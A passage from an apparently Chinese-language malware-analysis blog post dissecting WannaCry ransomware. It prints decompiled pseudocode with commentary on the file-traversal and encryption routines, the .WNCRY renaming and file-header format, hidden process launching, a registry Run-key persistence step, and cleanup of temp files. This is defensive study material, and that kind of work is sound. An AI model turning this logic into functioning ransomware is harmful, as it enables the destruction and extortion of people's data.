<span class="token function">sub_10003760</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v36<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

v14 <span class="token operator">=</span> a4<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> a4 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

v15 <span class="token operator">=</span> Format<span class="token punctuation">;</span>  

v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">wcsnicmp</span><span class="token punctuation">(</span>Format<span class="token punctuation">,</span> asc_1000CC14<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

v14 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token keyword">else</span>  

v15 <span class="token operator">=</span> Format <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  

v16 <span class="token operator">=</span> <span class="token operator">*</span>v15<span class="token punctuation">;</span>  

<span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v15<span class="token punctuation">;</span> v16<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v16 <span class="token operator">==</span> <span class="token number">92</span> <span class="token punctuation">)</span>  

<span class="token operator">++</span>v14<span class="token punctuation">;</span>  

v16 <span class="token operator">=</span> j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> v34 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">CopyReadMeTxt</span><span class="token punctuation">(</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 将@Please_Read_Me@.txt 拷贝到D盘下  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>  

<span class="token function">CopyWanaDecryptor_0</span><span class="token punctuation">(</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将@WanaDecryptor@.exe拷贝到D盘  </span>

<span class="token keyword">else</span>  

<span class="token function">CopyWanaDecryptor</span><span class="token punctuation">(</span>Format<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 将@WanaDecryptor@.exe拷贝到D盘  </span>

<span class="token punctuation">&#125;</span>  

v18 <span class="token operator">=</span> v30<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> a5 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

v19 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span>v30<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">)</span>v30 <span class="token operator">!=</span> v30 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

v20 <span class="token operator">=</span> v14 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token keyword">do</span>  

<span class="token punctuation">&#123;</span>  

v21 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>v19<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v21 <span class="token punctuation">)</span>  

v21 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>`std<span class="token operator">::</span>basic_string<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">></span><span class="token punctuation">,</span>std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">>></span><span class="token operator">::</span>_Nullstr<span class="token string">'::`2'</span><span class="token operator">::</span>_C<span class="token punctuation">;</span>  

<span class="token function">TraverseAndEncryptFiles</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v35<span class="token punctuation">,</span> v21<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> v20<span class="token punctuation">,</span> a5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 递归遍历文件  </span>

v19 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v19<span class="token punctuation">;</span>  

v18 <span class="token operator">=</span> v30<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> v19 <span class="token operator">!=</span> v30 <span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

v22 <span class="token operator">=</span> v18<span class="token punctuation">;</span>  

<span class="token function">LOBYTE</span><span class="token punctuation">(</span>v49<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v23 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v18<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v18 <span class="token operator">!=</span> v18 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">do</span>  

<span class="token punctuation">&#123;</span>  

v24 <span class="token operator">=</span> v23<span class="token punctuation">;</span>  

v23 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v23<span class="token punctuation">;</span>  

<span class="token function">DeleteAllocMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v29<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v36<span class="token punctuation">,</span> v24<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 释放所有申请的空间  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数会首先遍历所有的文件，对文件和文件夹执行不同的操作并且对后缀名进行过滤，跳过@Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk，@WanaDecryptor@.bmp总结为枚举</p>
<h3 id="6-2-5-第五层"><a href="#6-2-5-第五层" class="headerlink" title="6.2.5 第五层"></a>6.2.5 第五层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token class-name">FILE_TYPE</span>  
<span class="token punctuation">&#123;</span>  
FILE_TYPE_NULL <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  
FILE_TYPE_EXEDLL<span class="token punctuation">,</span>  
FILE_TYPE_DOC<span class="token punctuation">,</span>  
FILE_TYPE_DOCEX<span class="token punctuation">,</span>  
FILE_TYPE_WNCRYT<span class="token punctuation">,</span> <span class="token comment">//.wncryt  </span>
FILE_TYPE_WNCYR<span class="token punctuation">,</span> <span class="token comment">//.wncyr  </span>
FILE_TYPE_WNCRY <span class="token comment">//.wncry  </span>
<span class="token punctuation">&#125;</span>  

<span class="token keyword">int</span> __thiscall <span class="token function">EncryptAllFile</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> this<span class="token punctuation">,</span> <span class="token class-name">wchar_t</span> TargetFileFullPath<span class="token punctuation">,</span> <span class="token keyword">int</span> Num_1<span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>  

<span class="token keyword">const</span> <span class="token class-name">wchar_t</span> this_1<span class="token punctuation">;</span> <span class="token comment">// edi  </span>
<span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax  </span>
this_1 <span class="token operator">=</span> this<span class="token punctuation">;</span>  

	<span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">sub_10002E70</span><span class="token punctuation">(</span>TargetFileFullPath<span class="token punctuation">,</span> Num_1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 根据返回值不同执行不同的操作  </span>
	<span class="token punctuation">&#123;</span>  

	<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  

	<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>  <span class="token function">DeleteFileW_Addr</span><span class="token punctuation">(</span>TargetFileFullPath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  

	<span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">EncryptFiles</span><span class="token punctuation">(</span>this_1<span class="token punctuation">,</span> TargetFileFullPath<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 加密文件 </span>
		<span class="token punctuation">&#123;</span>  
			<span class="token function">wcscat</span><span class="token punctuation">(</span>TargetFileFullPath<span class="token punctuation">,</span> WNCRT<span class="token punctuation">)</span><span class="token punctuation">;</span>  
			<span class="token function">wcscat</span><span class="token punctuation">(</span>TargetFileFullPath <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">,</span> WNCRT<span class="token punctuation">)</span><span class="token punctuation">;</span>  
			<span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>TargetFileFullPath <span class="token operator">+</span> <span class="token number">312</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  
		<span class="token punctuation">&#125;</span>  
		<span class="token keyword">goto</span> LABEL_5<span class="token punctuation">;</span>  

	<span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                                     <span class="token comment">// .jpg  </span>
        <span class="token function">EncryptFiles</span><span class="token punctuation">(</span>this_1<span class="token punctuation">,</span> TargetFileFullPath<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
		result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  
		<span class="token keyword">break</span><span class="token punctuation">;</span>  

	<span class="token keyword">default</span><span class="token operator">:</span>  

	LABEL_5<span class="token operator">:</span>  
		result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
		<span class="token keyword">break</span><span class="token punctuation">;</span>  

		<span class="token punctuation">&#125;</span>  
	<span class="token keyword">return</span> result<span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>针对该函数的加密策略做一个总结：</p>
<ol>
<li><p> 在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理</p>
</li>
<li><p>枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件<br> cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR<br> cmd=2, 删除.WNCRYT</p>
</li>
<li><p> cmd=3, 加密链表中所有文件（移出链表）</p>
</li>
<li><p> cmd=4, 加密可能剩余链表中的文件</p>
</li>
</ol>
<blockquote>
<p>虽然操作不同 但是加密函数是同一个 接下来再次进入EncryptFiles</p>
</blockquote>
<h3 id="6-2-6-第六层"><a href="#6-2-6-第六层" class="headerlink" title="6.2.6 第六层"></a>6.2.6 第六层</h3><ol>
<li><p>  pTargetPostFix = wcsrchr(&amp;NewTargetFileFullPath, ‘.’);// 获取文件后缀名  </p>
</li>
<li><p>   pTargetPostFix_1 = pTargetPostFix;  </p>
</li>
<li><p>   if ( !pTargetPostFix )  </p>
</li>
<li><p>   {  </p>
</li>
<li><p>     pTargetPostFix_2 = &NewTargetFileFullPath;  </p>
</li>
<li><p>     goto LABEL_6;  </p>
</li>
<li><p>   }  </p>
</li>
<li><p>   IsWNCRY = wcsicmp(pTargetPostFix, WNCRT);     // 将后缀名与WNCRY比较  </p>
</li>
<li><p>   pTargetPostFix_2 = pTargetPostFix_1;  </p>
</li>
<li><p>  if ( IsWNCRY )  </p>
</li>
<li><p>  {  </p>
</li>
<li><p>LABEL_6:  </p>
</li>
<li><p>    wcscat(pTargetPostFix_2, Source);           // 字符串拼接 原后缀+.WNCRY  </p>
</li>
<li><p>    goto LABEL_8;  </p>
</li>
<li><p>  }  </p>
</li>
<li><p>  wcscpy(pTargetPostFix_1, Source);  </p>
</li>
<li><p>LABEL_8:  </p>
</li>
<li><p>  if ( GetFileAttributesW(&amp;NewTargetFileFullPath) != -1  </p>
</li>
<li><p>    || StartEncryptFiles((char *)v9, (int)OldTargetFileFullPath, &amp;NewTargetFileFullPath, Num_4) )// 开始加密文件  </p>
</li>
<li><p>  {  </p>
</li>
<li><p>    if ( Num_4 == 4 )  </p>
</li>
<li><p>      sub_10002BA0(v9, OldTargetFileFullPath);  </p>
</li>
<li><p>    result = 1;  </p>
</li>
<li><p>  }  </p>
</li>
<li><p>  else  </p>
</li>
<li><p>  {  </p>
</li>
<li><p>    DeleteFileW_Addr(&amp;NewTargetFileFullPath);  </p>
</li>
<li><p>    result = 0;  </p>
</li>
<li><p>  }  </p>
</li>
<li><p>  return result;  </p>
</li>
<li><p>}  </p>
</li>
</ol>
<p>这个函数仍然是作为加密函数的准备工作，获取文件的后缀名，将后缀名和.WNCRY做比较，如果一致就不加密，然后将原后缀与.WNCRY做拼接，然后开始加密文件</p>
<h3 id="6-2-7-第七层"><a href="#6-2-7-第七层" class="headerlink" title="6.2.7 第七层"></a>6.2.7 第七层</h3><ol>
<li><p> if ( !GetFileSizeEx(hFile_1, &amp;FileSize) )     // 获取目标文件大小  </p>
</li>
<li><p> {  </p>
</li>
<li><p>   local_unwind2((int)&amp;ms_exc.registration, -1);  </p>
</li>
<li><p>   return 0;  </p>
</li>
<li><p> }  </p>
</li>
<li><p> GetFileTime(hFile_1, &amp;CreationTime, &amp;LastAccessTime, &amp;LastWriteTime);// 获取文件时间  </p>
</li>
<li><p> if ( ReadFile_Addr(hFile_1, &amp;lpBuffer, 8, &amp;lpNumberOfBytesRead, 0)// 读取0x8个字节的文件内容  </p>
</li>
<li><p>   &amp;&amp; !memcmp(&amp;lpBuffer, aWanacry, 8u)         // 将0x8个字节与WANACRY!比较  </p>
</li>
</ol>
<pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li> 读取文件前0x8个字节，与WNACRY！作比较</li>
</ol>
<pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><p> SetFilePointer(hFile, 0, 0, 0);               // 将文件指针重新设置到文件开头  </p>
</li>
<li><p>   if ( a4 == 4 )  </p>
</li>
<li><p>   {  </p>
</li>
<li><p>     swprintf(&amp;String, (size_t)aSS, NewTargetFileFullPath, aT);// 拼接字符串 在原文件后加上.WNCRYT  </p>
</li>
<li><p>     NewhFile = (void *)CreateFileW_Addr(&amp;String, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);// 创建文件  </p>
</li>
</ol>
<p>2．使用源文件名 + .WNCRYT 创建一个新的空的文件</p>
<ol>
<li><p> if ( !EncryptDatas(v32, &amp;pbBuffer, 0x10u, (int)&amp;v17, (int)&amp;v20) )// 对数据进行加密  </p>
</li>
<li><p>     goto LABEL_39;  </p>
</li>
<li><p>   sub_10005DC0(this_1 + 84, (int)&amp;pbBuffer, (int)off_1000D8D4, 16, 16);  </p>
</li>
<li><p>   memset(&amp;pbBuffer, 0, 0x10u);  </p>
</li>
<li><p>   if ( !WriteFile_Addr(NewhFile, aWanacry, 8, &amp;v35, 0)// 写入到创建的文件-&gt;WANACRY!   </p>
</li>
<li><p>     || !WriteFile_Addr(NewhFile, &amp;v20, 4, &amp;v35, 0)// 写入到创建的文件-&gt;0x100  </p>
</li>
<li><p>     || !WriteFile_Addr(NewhFile, &amp;v17, v20, &amp;v35, 0)// 写入0x100个字节的加密数据到文件  </p>
</li>
<li><p>     || !WriteFile_Addr(NewhFile, &amp;a4, 4, &amp;v35, 0)// 写入0x4到文件  </p>
</li>
<li><p>     || !WriteFile_Addr(NewhFile, &amp;FileSize, 8, &amp;v35, 0) )// 写入0x081006到文件 </p>
</li>
</ol>
<pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="2">
<li> 将加密后的数据写入到新创建的文件中</li>
</ol>
<pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><p> if ( !ReadFile_Addr(hFile_2, *((_DWORD *)this_1 + 306), 0x10000, &amp;lpNumberOfBytesRead, 0)  </p>
</li>
<li><p>   || lpNumberOfBytesRead != 0x10000 )     // 读取目标文件  </p>
</li>
<li><p> {  </p>
</li>
<li><p> 21:  </p>
</li>
<li><p>   local_unwind2((int)&amp;ms_exc.registration, -1);  </p>
</li>
<li><p>   return 0;  </p>
</li>
<li><p> }  </p>
</li>
<li><p> sub_10006940((int)(this_1 + 84), *((_DWORD *)this_1 + 306), *((char )this_1 + 307), 0x10000u, 1);  </p>
</li>
<li><p> if ( WriteFile_Addr(NewhFile, *((_DWORD *)this_1 + 307), 0x10000, &amp;v35, 0) &amp;&amp; v35 == 0x10000 )// 将加密后的内容写入到新文件  </p>
</li>
</ol>
<pre class="line-numbers language-&#123;" data-language="&#123;"><code class="language-&#123;">&lt;!-- --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="3">
<li> 读取源文件，并将加密后的内容写入到新创建的文件中</li>
</ol>
<p>到此为止，加密函数的分析已经完成</p>
<h2 id="6-3-剩余函数分析"><a href="#6-3-剩余函数分析" class="headerlink" title="6.3 剩余函数分析"></a>6.3 剩余函数分析</h2><p>这部分我们将对 t.wnry.dll 中剩余的函数进行逐一的分析</p>
<h3 id="6-3-1-StartTaskdl-线程回调-隐藏启动taskdl-exe"><a href="#6-3-1-StartTaskdl-线程回调-隐藏启动taskdl-exe" class="headerlink" title="6.3.1 StartTaskdl 线程回调+隐藏启动taskdl.exe"></a>6.3.1 StartTaskdl 线程回调+隐藏启动taskdl.exe</h3><ol>
<li> if ( !CreateProcessA(0u, lpCommandLine, 0u, 0u, 0, 0x8000000u, 0u, 0u, &amp;StartupInfo, &amp;ProcessInformation) )// 创建Taskdl.exe进程  </li>
</ol>
<p>该函数每隔3秒会以隐藏的方式启动 taskdl.exe</p>
<h3 id="6-3-2-StartExeAndSetReg"><a href="#6-3-2-StartExeAndSetReg" class="headerlink" title="6.3.2 StartExeAndSetReg"></a>6.3.2 StartExeAndSetReg</h3><p>线程回调+启动taskse.exe和@WanaDecryptor@.exe)+修改注册表</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">ReadFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_wnryBase<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 读取c.wnry的内容到内存  </span>

<span class="token punctuation">&#125;</span>  

<span class="token function">StartTaskseAndDecryptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 启动taskse.exe和@WanaDecryptor@.exe  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">GetFullPathNameA</span><span class="token punctuation">(</span>aTaskscheExe<span class="token punctuation">,</span> <span class="token number">0x208u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// C:UsersDingisoDesktoptasksche.exe  </span>

<span class="token function">SetRegRun</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 设置注册表启动项  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数每隔三秒启动taskse.exe 和 @WanaDecryptor@.exe 然后利用 CMD<br>设置注册表启动项为 tasksche.exe 的绝对地址</p>
<h3 id="6-3-3-RepeatOperation-重复操作"><a href="#6-3-3-RepeatOperation-重复操作" class="headerlink" title="6.3.3 RepeatOperation 重复操作"></a>6.3.3 RepeatOperation 重复操作</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetFileAttributesA</span><span class="token punctuation">(</span>aFWnry<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>       <span class="token comment">// 检测f.wnry是否存在  </span>

<span class="token function">sub_100018F0</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>CurrentTime <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

CurrentTime <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">CreateRes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 写入0x8个字节到00000000.res  </span>

<span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> aSFi<span class="token punctuation">,</span> NewFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// @WanaDecryptor@.exe fi  </span>

<span class="token function">StartTargetFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token number">0x186A0u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">ReadFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_wnryBase<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token function">RunBat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                     <span class="token comment">// 创建并启动批处理脚本  </span>

<span class="token function">CreateReadMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">// 创建@Please_Read_Me@.txt  </span>

<span class="token function">EncryptOtherUsersFiles</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 加密windows剩余所有用户的文件 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数有三个重要的函数，就不展开分析了，我在这里将把他们的逻辑表述清楚</p>
<ol>
<li>RunBat():判断@WanaDecryptor@.exe.lnk是否存在，如果不存在就创建一个批处理脚本，将命令写入.bat脚本脚本作用为给@WanaDecryptor@.exe创建快捷方式）</li>
<li>CreateReadMe():检测工作路径下是否存在 ReadMe不存在就从r.wnry中读取内容并写入 ReadMe</li>
<li> EncryptOtherUsersFiles():获取Windows所有的用户名，判断是否与当前的有户名相同，不同就加密该用户的所有文件</li>
</ol>
<h2 id="7-taskdle-exe-病毒辅助文件分析"><a href="#7-taskdle-exe-病毒辅助文件分析" class="headerlink" title="7 taskdle.exe 病毒辅助文件分析"></a>7 taskdle.exe 病毒辅助文件分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">dwDrives <span class="token operator">=</span> <span class="token function">GetLogicalDrives</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 获取系统中所有的磁盘  </span>

v5 <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span>  

<span class="token keyword">do</span>  

<span class="token punctuation">&#123;</span>  

<span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>RootPathName <span class="token operator">=</span> dword_403060<span class="token punctuation">;</span>  

v8 <span class="token operator">=</span> dword_403064<span class="token punctuation">;</span>  

RootPathName<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>dwDrives <span class="token operator">>></span> v5<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">GetDriveTypeW</span><span class="token punctuation">(</span>RootPathName<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token comment">//获取D盘类型  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">DeleteFile</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 清空回收站和临时目录所有以.WNCRYT 结尾文件  </span>

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token operator">--</span>v5<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
